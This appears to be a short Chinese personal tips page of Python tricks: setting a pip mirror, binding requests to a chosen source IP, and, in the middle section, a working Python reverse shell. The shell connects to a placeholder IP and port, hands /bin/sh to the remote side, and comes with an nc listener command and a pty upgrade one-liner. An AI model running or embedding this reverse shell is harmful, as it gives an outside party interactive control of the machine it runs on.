#写在前面

嗯哼，Python很好玩呢...记录一点黑科技咯

当你尝试一个包的时候，注意自己的py文件名称不能与包名重名，例如不要出现flask.py

----

#设置pip源

```
echo """
[global]
index-url = https://pypi.doubanio.com/simple/
""">~/.pip/pip.conf
```

#反弹shell

首先自己的服务器上用**nc -l 端口**

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(( "IP地址" , 端口 ))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

##获得一个tty

    python -c 'import pty; pty.spawn("/bin/sh")'

----

#让requests使用多个IP

```python
import socket
real_create_conn = socket.create_connection
def set_src_addr(*args):
    address, timeout = args[0], args[1]
    source_address = ( 需要使用的IP , 0)
    return real_create_conn(address, timeout, source_address)
socket.create_connection = set_src_addr
import requests
```